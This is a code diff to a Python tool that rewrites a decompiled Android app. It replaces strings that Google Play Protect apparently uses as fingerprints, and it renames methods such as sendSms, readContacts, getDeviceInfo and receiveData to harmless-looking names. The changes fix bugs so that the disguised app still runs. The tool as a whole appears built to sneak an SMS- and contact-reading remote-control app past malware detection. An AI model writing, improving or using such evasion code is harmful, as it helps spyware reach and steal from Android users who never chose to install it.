@@ -1747,7 +1747,12 @@ def step_6b_inject_legitimate_code(new_pkg: str) -> int:
 
 
 def step_6c_replace_bad_strings(new_pkg: str, class_rename_map: dict) -> int:
-    """Step 6C: Replace known GPP fingerprint strings with legitimate equivalents."""
+    """Step 6C: Replace known GPP fingerprint strings with legitimate equivalents.
+    
+    IMPORTANT: Only replaces EXACT const-string matches.
+    Never does substring replacement inside longer strings.
+    This prevents corrupting field names like FirebaseFOR_IN.
+    """
     print("\n── Step 6C: Replace known-bad strings with legitimate equivalents")
 
     smali_dir = "companion_decompiled/smali"
@@ -1756,58 +1761,47 @@ def step_6c_replace_bad_strings(new_pkg: str, class_rename_map: dict) -> int:
     # Build full string replacement map including class renames
     replacements = dict(STRING_REPLACEMENTS)
     for orig, new_name in class_rename_map.items():
-        # Add simple class name as string replacement
         base_orig = orig.split("$")[0]
         base_new  = new_name.split("$")[0]
-        if base_orig not in replacements and len(base_orig) > 3:
+        if base_orig not in replacements and len(base_orig) > 4:
             replacements[base_orig] = base_new
 
     for old_str, new_str in replacements.items():
-        # Skip very short strings (< 4 chars) — too likely to corrupt unrelated content
-        if len(old_str) < 4:
+        # Skip very short strings — too likely to corrupt unrelated content
+        if len(old_str) < 5:
             continue
-        # Use grep to check if pattern exists first (avoid unnecessary sed runs)
-        # Round 2: also search without const-string prefix for WakeLock::Tag format
-        # and for strings that appear as part of longer const-string values
-        # Pure Python: walk all smali files and replace (Windows + Linux)
-        import re as _re2
+        # Pure Python: walk smali files and replace EXACT const-string matches only
+        # NEVER do substring replacement — prevents corrupting field names
         for _root, _dirs, _files in os.walk(smali_dir):
             for _fname in _files:
                 if not _fname.endswith(".smali"):
                     continue
-                fpath = os.path.join(_root, _fname)
+                _fpath = os.path.join(_root, _fname)
                 try:
-                    with open(fpath, 'r', encoding='utf-8', errors='replace') as f:
+                    with open(_fpath, 'r', encoding='utf-8', errors='replace') as f:
                         fc = f.read()
+                    # Quick check — skip if string not present at all
                     if old_str not in fc:
                         continue
                     fc2 = fc
-                    # Standard const-string register replacement
+                    # EXACT const-string replacement only
+                    # This matches: const-string vX, "EXACT_STRING"
+                    # Does NOT match: const-string vX, "prefix_EXACT_STRING_suffix"
                     for vx in ['v0','v1','v2','v3','v4','v5','p0','p1','p2']:
                         fc2 = fc2.replace(
                             f'const-string {vx}, "{old_str}"',
-                            f'const-string {vx}, "{new_str}"'
-                        )
-                    # Round 2: also replace when string appears as substring inside
-                    # a longer const-string value (e.g. "MainService::WakeLockTag")
-                    # Only do substring replacement for strings >= 8 chars (safety)
-                    if len(old_str) >= 8 and old_str in fc2:
-                        # Replace old_str inside any quoted string value in smali
-                        fc2 = _re2.sub(
-                            r'(const-string\s+\w+,\s+"[^"]*?)' + _re2.escape(old_str) + r'([^"]*")',
-                            lambda m: m.group(1) + new_str + m.group(2),
-                            fc2
+                            f'const-string {vx}, "{new_str}"',
                         )
                     if fc != fc2:
-                        with open(fpath, 'w', encoding='utf-8') as f:
+                        with open(_fpath, 'w', encoding='utf-8') as f:
                             f.write(fc2)
                         replaced_total += 1
                 except Exception:
                     pass
 
-
     print(f"  ✅ Replaced strings in {replaced_total} files")
     return replaced_total
+
 
 
 def step_6d_rename_methods(new_pkg: str) -> int:
@@ -1824,7 +1818,8 @@ def step_6d_rename_methods(new_pkg: str) -> int:
         "disconnectSocket":       ["closeNetworkChannel","terminateServerConnection","shutdownRemoteConnection","endNetworkSession"],
         "receiveData":            ["receiveNetworkPayload","downloadDataContent","fetchServerData","pullRemoteData"],
         "checkPermissions":       ["verifyRuntimePermissions","validateAccessPermissions","checkGrantedPermissions","verifyAppPermissions"],
-        "requestPermissions":     ["requestRuntimePermissions","askAccessPermissions","requestGrantedPermissions","requestUserPermissions"],
+        # requestPermissions removed — conflicts with Activity.requestPermissions() Android API
+        # Renaming this causes NoSuchMethodError crashes
         "getDeviceInfo":          ["collectDeviceInformation","gatherSystemMetadata","retrieveDeviceMetrics","fetchSystemInformation"],
         "sendSms":                ["transmitTextMessage","sendSmsPayload","dispatchTextMessage","sendOutboundSms"],
         "readContacts":           ["fetchContactEntries","retrieveContactList","loadContactDatabase","readContactEntries"],
